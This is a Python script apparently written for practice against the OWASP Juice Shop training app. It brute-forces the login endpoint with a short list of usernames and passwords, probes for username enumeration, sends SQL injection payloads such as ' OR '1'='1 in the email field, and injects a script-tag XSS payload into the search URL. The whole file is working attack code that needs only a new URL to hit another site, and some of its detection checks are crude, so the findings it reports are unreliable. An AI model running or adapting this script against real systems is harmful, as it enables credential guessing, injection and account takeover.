import re
import requests
from bs4 import BeautifulSoup

url = 'https://juice-shop.herokuapp.com/rest/user/login'
csrf_url = 'https://juice-shop.herokuapp.com'
search_url = 'https://juice-shop.herokuapp.com/#/search'
known_usernames = ['admin', 'customer', 'user', "' OR 1=1--"]
password_attempts = ['password', 'admin123', 'letmein']
user_agent = {'User-Agent': 'Mozilla/5.0'}
possible_sources = ['/rest/user/login', '/api/UserService/rest']

def get_csrf_token(session):
    response = session.get(csrf_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_meta_tag = soup.find('meta', {'name': '_csrf'})
    csrf_input_tag = soup.find('input', {'name': '_csrf'})
    if csrf_input_tag:
        return csrf_input_tag['value']
    elif csrf_meta_tag:
        return csrf_meta_tag['content']
    return ''

def enhanced_check_username_enumeration(session):
    valid_response_key = "Invalid email or password."
    headers = {'Content-Type': 'application/json', 'User-Agent': user_agent['User-Agent']}
    addition_attempt = ['invaliduser']
    enumerate_usernames = known_usernames + addition_attempt

    for username in enumerate_usernames:
        for password in password_attempts:
            csrf_token = get_csrf_token(session)
            payload = {'email': username, 'password': password, '_csrf': csrf_token}
            response = session.post(url, json=payload, headers=headers)
            if valid_response_key not in response.text:
                print(f"Possible username enumeration with username: {username}")
                break

def scan_for_vulnerabilities(session, url):
    headers = {'Content-Type': 'application/json', 'User-Agent': user_agent['User-Agent']}
    csrf_token = get_csrf_token(session)

    sql_payload = "' OR '1'='1"
    response = session.post(url, headers=headers, json={'email': sql_payload, 'password': 'test', '_csrf': csrf_token})
    if 'auth' in response.text:
        print("Possible SQL Injection vulnerability identified.")

    xss_payload = "<script>alert(1)</script>"
    search_response = session.get(search_url + '?q=' + xss_payload)
    if xss_payload in search_response.text:
        print("Possible XSS vulnerability identified.")

    for username in known_usernames:
        for password in password_attempts:
            csrf_token = get_csrf_token(session)
            login_data = {'email': username, 'password': password, '_csrf': csrf_token}
            login_response = session.post(url, headers=headers, json=login_data)
            if "Login successful" in login_response.text:
                print(f"Successful login with username: {username} and password: {password}")

with requests.Session() as session:
    enhanced_check_username_enumeration(session)
    scan_for_vulnerabilities(session, url)
